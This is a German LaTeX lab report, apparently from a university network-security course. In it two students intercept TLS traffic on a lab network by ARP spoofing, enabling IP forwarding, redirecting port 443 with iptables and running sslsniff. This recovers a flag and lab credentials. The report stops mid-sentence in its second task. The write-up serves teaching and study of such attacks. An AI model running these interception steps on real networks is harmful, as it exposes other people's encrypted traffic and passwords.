\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}


\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 6}
\begin{document}
\maketitle
 
\section*{Aufgabe 1}

\subsection*{a)}
Ein Mitschnitt mittels Wireshark auf den Workstations zeigte, dass sich auf den Workstations mit den IPs \texttt{192.26.175.11} und \texttt{192.26.175.13} ein Prozess mittels TLSv1.1 mit der IP \texttt{192.26.175.15} verbindet. Um diese Verbindung mitzuschneiden änderten wir auf der Workstation mittels 
\begin{verbatim}
arp -s 192.26.175.15 52:54:00:2c:4f:ec
\end{verbatim}
Den ARP Eintrag für die IP \texttt{192.26.175.15} auf die MAC Adresse der Kali VM auf derselben Workstation.
In der Kali VM starten wir das Tool sslsniff.
Um dieses Tool verwenden zu können, mussten wir in der Kali VM mittels
\begin{verbatim}
echo 1 > /proc/sys/net/ipv4/ip_forward
\end{verbatim} 
Das IP forwarding einschalten. Außerdem haben wir wie in der \texttt{man-page} von \texttt{sslsniff} beschrieben die Regel für IP Tables umgeschrieben, sodass alle Zugriffe auf den Port 443 auf den Port 4433 umgeleitet werden.
\begin{verbatim}
iptables -t nat -A PREROUTING -p tcp --destination-port 443  -j REDIRECT --to-ports 4433
\end{verbatim}
Danach starteten wir sslsniff mit den folgenden Parametern:
\begin{verbatim}
sslsniff  -a  -c  /usr/share/sslsniff/certs/wildcard  -s 4433 -w /tmp/sslsniff.log
\end{verbatim}
Nach kurzer Zeit fanden wir die folgenden Zeilen in der Logdatei \texttt{sslsniff.log}:
\begin{verbatim}
Hallo bernd!
Hier ist deine Flagge: 1107174691af9ff3681d2b5bdb5740b1589bae53

Neue Zugangsdaten
Benutzer: bernd
Passwort: SicheresPasswort
\end{verbatim}
Die Flagge lautet also \texttt{1107174691af9ff3681d2b5bdb5740b1589bae53}


\subsection*{b)}
Im Netzwerk fällt außerdem eine Active Discovery Offer für ein PPPoED Netzwerk auf.
\begin{verbatim}
CadmusCo_48:ae:eb	RealtekU_12:23:11	PPPoED	60	Active Discovery Offer (PADO) AC-Name='BerndCom'
\end{verbatim}
Mit den Zugangsdaten aus der Aufgabe a) kann man eine PPPoE Verbindung aufbauen. Leider passiert in diesem Netzwerk nichts.

\section*{Aufgabe 2}
Da das EAP Protokoll nicht verschlüsselt ist, kann man aus den vier mitgeschnittenen

\end{document}
